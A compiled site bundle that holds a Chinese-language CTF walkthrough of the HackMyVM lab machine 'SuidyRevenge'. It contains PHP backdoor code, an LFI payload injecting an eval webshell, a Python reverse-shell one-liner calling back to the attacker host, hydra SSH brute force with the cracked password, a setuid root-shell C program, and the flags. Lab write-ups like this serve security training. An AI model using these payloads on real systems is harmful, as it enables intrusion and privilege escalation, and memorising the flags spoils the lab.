"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[958],{31124:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>i,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"HackMyVM/Machines/SuidyRevenge/index","title":"SuidyRevenge","description":"[Linux VM] [Tested on VirtualBox] created by || sml","source":"@site/docs/HackMyVM/Machines/SuidyRevenge/index.md","sourceDirName":"HackMyVM/Machines/SuidyRevenge","slug":"/HackMyVM/Machines/SuidyRevenge/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/SuidyRevenge/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/SuidyRevenge/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"Soul","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Soul/"},"next":{"title":"Tryharder","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Tryharder/"}}');var t=r(74848),d=r(28453);const i={},a="SuidyRevenge",l={},o=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"User - www-data",id:"user---www-data",level:2},{value:"\u9898\u76ee\u63d0\u793a",id:"\u9898\u76ee\u63d0\u793a",level:3},{value:"SSH \u7206\u7834 - murda",id:"ssh-\u7206\u7834---murda",level:2},{value:"User - murda",id:"user---murda",level:2},{value:"\u9898\u76ee\u63d0\u793a",id:"\u9898\u76ee\u63d0\u793a-1",level:3},{value:"\u63a2\u6d4b\u73b0\u6709\u7528\u6237",id:"\u63a2\u6d4b\u73b0\u6709\u7528\u6237",level:3},{value:"User - theuser",id:"user---theuser",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"User - suidy",id:"user---suidy",level:2},{value:"\u9898\u76ee\u63d0\u793a",id:"\u9898\u76ee\u63d0\u793a-2",level:3},{value:"\u7f16\u5199\u6076\u610f\u7a0b\u5e8f",id:"\u7f16\u5199\u6076\u610f\u7a0b\u5e8f",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag- root",id:"flag--root",level:3}];function c(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",p:"p",pre:"pre",...(0,d.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"suidyrevenge",children:"SuidyRevenge"})}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-10-02"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // c3278d7fedcca7de2ac31a3d6f65ab19"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 73"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 77"}),(0,t.jsx)(n.p,{children:"\ud83d\udcddNotes //\nEnjoy the path to get root. Tested on VBox."})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.109\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 99:04:21:6d:81:68:2e:d7:fe:5e:b2:2c:1c:a2:f5:3d (RSA)\n|   256 b2:4e:c2:91:2a:ba:eb:9c:b7:26:69:08:a2:de:f2:f1 (ECDSA)\n|_  256 66:4e:78:52:b1:2d:b6:9a:8b:56:2b:ca:e5:48:55:2d (ED25519)\n80/tcp open  http    nginx 1.14.2\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: nginx/1.14.2\n"})}),"\n",(0,t.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bf7\u6c42"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-html",children:'Im proud to announce that "theuser" is not anymore in our servers.\nOur admin "mudra" is the best admin of the world.\n-suidy\n\n\x3c!--\n\n"mudra" is not the best admin, IM IN!!!!\nHe only changed my password to a different but I had time\nto put 2 backdoors (.php) from my KALI into /supersecure to keep the access!\n\n-theuser\n\n--\x3e\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u6839\u636e\u63d0\u793a\u4fe1\u606f\uff0c\u67e5\u770b Parrot \u81ea\u5e26\u7684 webshell \u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="/usr/share/webshells/php"',children:"drwxr-xr-x 1 root root   64  1 \u6708 22 \u65e5 03:13 findsocket\n-rw-r--r-- 1 root root 2.8K 2021 \u5e74 11 \u6708 21 \u65e5 php-backdoor.php\n-rwxr-xr-x 1 root root 5.4K 2021 \u5e74 11 \u6708 21 \u65e5 php-reverse-shell.php\n-rw-r--r-- 1 root root  14K 2021 \u5e74 11 \u6708 21 \u65e5 qsd-php-backdoor.php\n-rw-r--r-- 1 root root  328 2021 \u5e74 11 \u6708 21 \u65e5 simple-backdoor.php\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6839\u636e\u6587\u4ef6\u5217\u8868\u8fdb\u884c\u63a2\u6d4b\uff0c\u5f97\u5230\u4ee5\u4e0b\u4fe1\u606f"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="http://192.168.56.109/supersecure/simple-backdoor.php?cmd=ls"',children:"mysuperbackdoor.php\nsimple-backdoor.php\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7ecf\u8fc7\u63a2\u6d4b\uff0c",(0,t.jsx)(n.code,{children:"simple-backdoor.php"})," \u4e3a\u547d\u4ee4\u6267\u884c\u540e\u95e8\uff0c\u4f46\u662f\u53ef\u80fd\u5b58\u5728\u8fc7\u6ee4\uff0c\u53ea\u5141\u8bb8\u7eaf\u5b57\u6bcd + \u6570\u5b57\u7684\u6307\u4ee4\u6267\u884c"]}),"\n",(0,t.jsxs)(n.p,{children:[(0,t.jsx)(n.code,{children:"mysuperbackdoor.php"})," \u4e3a\u6587\u4ef6\u8bfb\u53d6\u7684\u540e\u95e8\uff0c\u4f7f\u7528 ",(0,t.jsx)(n.code,{children:"php://filter/read=convert.base64-encode/resource="})," \u53ef\u4ee5\u7ed5\u8fc7\u89e3\u6790\u8bfb\u53d6 php \u6587\u4ef6\u7684\u6e90\u7801"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",metastring:'title="simple-backdoor.php"',children:'<?php\n\nif(isset($_REQUEST[\'cmd\'])){\n        echo "<pre>";\n        $cmd = ($_REQUEST[\'cmd\']);\n        $result = preg_replace("/[^a-zA-Z0-9]+/", "", $cmd);\n        system($result);\n        echo "</pre>";\n        die;\n}\n\n?>\n'})}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-php",metastring:'title=""',children:"<?php\ninclude $_REQUEST['file'];\n?>\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u501f\u52a9 php \u7684 LFI\uff0c\u53ef\u4ee5\u5b9e\u73b0 webshell \u90e8\u7f72"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.109/supersecure/mysuperbackdoor.php?file=data:text/plain,<?php @eval($_POST['a']) ?>\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u6210\u529f\u5b9e\u73b0 webshell \u90e8\u7f72\uff0c\u8fdb\u800c\u53cd\u5f39 shell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[\u2717]\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $nc -lvnp 9999\nlistening on [any] 9999 ...\nconnect to [192.168.56.102] from (UNKNOWN) [192.168.56.109] 58444\nwhoami\nwww-data\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u63d0\u5347 pty"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:'# python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\'\n\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 8888\n[14:33:30] Welcome to pwncat \ud83d\udc08!\n[14:33:39] received connection from 192.168.56.109:42180\n[14:33:39] 192.168.56.109:42180: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@suidyrevenge:/var/www/html/supersecure$ whoami\nwww-data\n'})}),"\n",(0,t.jsx)(n.h2,{id:"user---www-data",children:"User - www-data"}),"\n",(0,t.jsx)(n.h3,{id:"\u9898\u76ee\u63d0\u793a",children:"\u9898\u76ee\u63d0\u793a"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="/var/www/html/murdanote.txt"',children:"I always lost my password so Im using\none password from rockyou.txt !\n\n-murda\n"})}),"\n",(0,t.jsx)(n.h2,{id:"ssh-\u7206\u7834---murda",children:"SSH \u7206\u7834 - murda"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[\u2717]\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $hydra -v -V -I -l murda -P /usr/share/wordlists/rockyou.txt 192.168.56.109 ssh -t 4\n......\n[22][ssh] host: 192.168.56.109   login: murda   password: iloveyou\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---murda",children:"User - murda"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $pwncat-cs murda@192.168.56.109\n[14:37:23] Welcome to pwncat \ud83d\udc08!\nPassword: ********\n[14:37:25] 192.168.56.109:22: normalizing shell path\n           192.168.56.109:22: registered new host w/ db\n(local) pwncat$ back\n(remote) murda@suidyrevenge:/home/murda$ whoami\nmurda\n"})}),"\n",(0,t.jsx)(n.h3,{id:"\u9898\u76ee\u63d0\u793a-1",children:"\u9898\u76ee\u63d0\u793a"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/murda/secret.txt"',children:'I know that theuser is here!\nI just got the id_rsa from "violent".\nI will put the key in a secure place for theuser!\nI hope he find it.\nRemember that rockyou.txt is your friend!\n'})}),"\n",(0,t.jsx)(n.h3,{id:"\u63a2\u6d4b\u73b0\u6709\u7528\u6237",children:"\u63a2\u6d4b\u73b0\u6709\u7528\u6237"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) murda@suidyrevenge:/home$ ls -lh\ntotal 32K\ndrwxrwxr--  3 murda   murda   4.0K Oct  1  2020 murda\ndrwxrwx---  2 ruin    ruin    4.0K Oct  1  2020 ruin\ndrwxrwxr-x  3 suidy   suidy   4.0K Oct  2  2020 suidy\ndrwxrwx---  3 theuser theuser 4.0K Oct  2  2020 theuser\ndrwxrwx---  3 violent violent 4.0K Oct  1  2020 violent\ndrwxrwx---  2 yo      yo      4.0K Oct  1  2020 yo\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---theuser",children:"User - theuser"}),"\n",(0,t.jsx)(n.p,{children:"\u6839\u636e\u4e0a\u6587\u63d0\u5230\u7684 web \u670d\u52a1\u8fd4\u56de\u7684\u6570\u636e\uff0c\u4ece\u4e2d\u53ef\u4ee5\u5f97\u5230\u4e00\u7ec4\u51ed\u636e"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"theuser:different\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u767b\u9646"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs theuser@192.168.56.109\n[14:51:47] Welcome to pwncat \ud83d\udc08!\nPassword: *********\n[14:51:50] 192.168.56.109:22: normalizing shell path\n[14:51:51] 192.168.56.109:22: registered new host w/ db\n(local) pwncat$ back\n(remote) theuser@suidyrevenge:/home/theuser$ whoami\ntheuser\n"})}),"\n",(0,t.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) theuser@suidyrevenge:/home/theuser$ cat user.txt\n\n                                   .     **\n                                *           *.\n                                              ,*\n                                                 *,\n                         ,                         ,*\n                      .,                              *,\n                    /                                    *\n                 ,*                                        *,\n               /.                                            .*.\n             *                                                  **\n             ,*                                               ,*\n                **                                          *.\n                   **                                    **.\n                     ,*                                **\n                        *,                          ,*\n                           *                      **\n                             *,                .*\n                                *.           **\n                                  **      ,*,\n                                     ** *,\n\n\n\nHMVbisoususeryay\n"})}),"\n",(0,t.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,t.jsxs)(n.p,{children:["\u6839\u636e\u63a2\u6d4b\uff0c",(0,t.jsx)(n.code,{children:"suidy"})," \u7528\u6237\u7684\u7528\u6237\u76ee\u5f55\u53ef\u4ee5\u8bbf\u95ee"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) theuser@suidyrevenge:/home/suidy$ ls -lah\ntotal 52K\ndrwxrwxr-x 3 suidy suidy   4.0K Oct  2  2020 .\ndrwxr-xr-x 8 root  root    4.0K Oct  1  2020 ..\n-rw------- 1 suidy suidy     25 Oct  1  2020 .bash_history\n-rwxrwx--- 1 suidy suidy    220 Oct  1  2020 .bash_logout\n-rwxrwx--- 1 suidy suidy   3.5K Oct  1  2020 .bashrc\ndrwxr-xr-x 3 suidy suidy   4.0K Oct  1  2020 .local\n-rw-r----- 1 suidy suidy    262 Oct  1  2020 note.txt\n-rwxrwx--- 1 suidy suidy    807 Oct  1  2020 .profile\n-rwsrws--- 1 root  theuser  17K Oct  2  2020 suidyyyyy\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5176\u4e2d\uff0c",(0,t.jsx)(n.code,{children:"suidyyyyy"})," \u5177\u6709 suid\uff0c\u5e76\u4e14\u5f53\u524d\u7528\u6237\u5177\u6709\u6267\u884c\u7684\u6743\u9650\uff0c\u76f4\u63a5\u6267\u884c\u5373\u53ef\u6a2a\u5411"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) theuser@suidyrevenge:/home/suidy$ ./suidyyyyy\nsuidy@suidyrevenge:/home/suidy$ whoami\nsuidy\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---suidy",children:"User - suidy"}),"\n",(0,t.jsx)(n.h3,{id:"\u9898\u76ee\u63d0\u793a-2",children:"\u9898\u76ee\u63d0\u793a"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="/home/suidy/note.txt"',children:'I know that theuser is not here anymore but suidyyyyy is now more secure!\nroot runs the script as in the past that always gives SUID to suidyyyyy binary\nbut this time also check the size of the file.\nWE DONT WANT MORE "theuser" HERE!.\nWE ARE SECURE NOW.\n\n-suidy\n'})}),"\n",(0,t.jsx)(n.h3,{id:"\u7f16\u5199\u6076\u610f\u7a0b\u5e8f",children:"\u7f16\u5199\u6076\u610f\u7a0b\u5e8f"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'#include<stdlib.h>\n\nint main(){\n    setuid(0);\n    setgid(0);\n    system("/bin/bash");\n    return 0;\n}\n'})}),"\n",(0,t.jsx)(n.p,{children:"\u7f16\u8bd1\u540e\u6267\u884c\u66ff\u6362"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) theuser@suidyrevenge:/home/theuser$ nano suid.c\n(remote) theuser@suidyrevenge:/home/theuser$ gcc suid.c -o suid\n(remote) theuser@suidyrevenge:/home/theuser$ cp ./suid /home/suidy/suidyyyyy\n(remote) theuser@suidyrevenge:/home/theuser$ cd /home/suidy/\n(remote) theuser@suidyrevenge:/home/suidy$ ls -lh\ntotal 24K\n-rw-r----- 1 suidy suidy   262 Oct  1  2020 note.txt\n-rwsrws--- 1 root  theuser 17K Feb 16 02:10 suidyyyyy\n(remote) theuser@suidyrevenge:/home/suidy$ ./suidyyyyy\nroot@suidyrevenge:/home/suidy# whoami\nroot\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,t.jsx)(n.h3,{id:"flag--root",children:"flag- root"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"root@suidyrevenge:/root# cat root.txt\n\n                                   .     **\n                                *           *.\n                                              ,*\n                                                 *,\n                         ,                         ,*\n                      .,                              *,\n                    /                                    *\n                 ,*                                        *,\n               /.                                            .*.\n             *                                                  **\n             ,*                                               ,*\n                **                                          *.\n                   **                                    **.\n                     ,*                                **\n                        *,                          ,*\n                           *                      **\n                             *,                .*\n                                *.           **\n                                  **      ,*,\n                                     ** *,\n\n\nHMVvoilarootlala\n"})})]})}function h(e={}){const{wrapper:n}={...(0,d.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},28453:(e,n,r)=>{r.d(n,{R:()=>i,x:()=>a});var s=r(96540);const t={},d=s.createContext(t);function i(e){const n=s.useContext(d);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),s.createElement(d.Provider,{value:n},e.children)}}}]);